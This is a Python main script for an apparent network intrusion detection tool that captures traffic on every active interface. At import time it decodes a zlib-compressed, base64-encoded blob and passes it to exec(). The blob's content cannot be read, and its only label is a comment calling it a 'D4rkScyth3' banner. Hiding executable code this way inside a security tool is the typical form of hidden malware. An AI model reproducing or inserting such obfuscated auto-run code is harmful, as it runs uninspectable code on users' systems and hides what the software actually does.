import sys
import psutil

from modules.PacketCapture import PacketCapture
from modules.TrafficAnalyzer import TrafficAnalyzer
from modules.AlertSystem import AlertSystem
from modules.IntrusionDetectionSystem import IntrusionDetectionSystem
#D4rkScyth3-banner
import zlib, base64
from colorama import Fore, Style, init
init(autoreset=True)

ENCODED_CODE = "eJytVMGO0zAQvecrRj45W7ZGgDhU6qGwoYsUirTtglayZKXddBvRJFXqCq3W/Ys9ceEDOPNDfAGfwIztdB0Kt1pK67x5njfzksyyqUtY1Ou6ycoMinJTNxre1U3+DKb6fo1/RVXoiH54ttMY2OZ6OGt2eRxFt/kStqv6q5pnVZU3PB5EgMvdwRCaJWMseqB0/bc3o8kelF1gl9+oFvNwiIT0IHIMAYQynGAASXGBVwzAHRNiR7tKLvbGE2Qbe9oYGwFhpJVSShwQ4eqWHUFD+aUVEiBiMAAWQsQYG0HYI/Jpw20Fgo7hRaCxew5GUt0YlbKrYyzV4CGu8IgiHarZ6nCFMi1CIeNNkpZNKT3oOLZQsBtxLIO/3HuN6b3ZHf/omXFo5bDXg6BvLBR0vhlHx2P/7gtaK7BC6S0B8kn6xEgKZLxtYV9BItz87R+KC/uc2iPkOGZXytiCcSukct54I4U8pA90/HOyZDzX8c8Zolz/1nokkin0IjnYq5CQZyvH8IdiZXt3d9LIlhLBCVfvPFg938H4KknwSz3p+gTvYQqXMIHrzjg46ep282DHF76o02SmRmm6j2gWEW/TFJXmbkjFAWLr+jAaJ5PZCHrAfn37AeNCX+7mSBnASuvNdiDEXaFXu3l/UZfi4lXzZbq416uX7CjRm/Q6oSy/vz/+hFm+zu9wwgZpdL/MxS0m2P4nwU2Sph8/U4pzBmfw+nnIYLJiZy9wBEfFEj+sKitz/KiGQ2BKlVlRKcXcLO6M5+gP3J9tXg=="

def run_encoded_code():
    try:
        exec(zlib.decompress(base64.b64decode(ENCODED_CODE)).decode("utf-8"))
    except Exception as e:
        print("[!] Error executing encoded code:", e)

run_encoded_code()


def list_active_interfaces():
    """Return all active interfaces (with IPv4, skip loopback)."""
    interfaces = []
    for name, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == 2 and addr.address != "127.0.0.1":
                interfaces.append(name)
    return interfaces


def main():
    interfaces = list_active_interfaces()
    if not interfaces:
        print("No active network interfaces found.")
        sys.exit(1)

    print("Starting NIDS on ALL active interfaces...")
    print("Interfaces:", ", ".join(interfaces))

    alert_system = AlertSystem()
    analyzer = TrafficAnalyzer(alert_system)
    ids = IntrusionDetectionSystem(alert_system=alert_system, logs_dir="logs")

    sniffer = PacketCapture(interfaces, analyzer)
    sniffer.start()

if __name__ == "__main__":
    main()
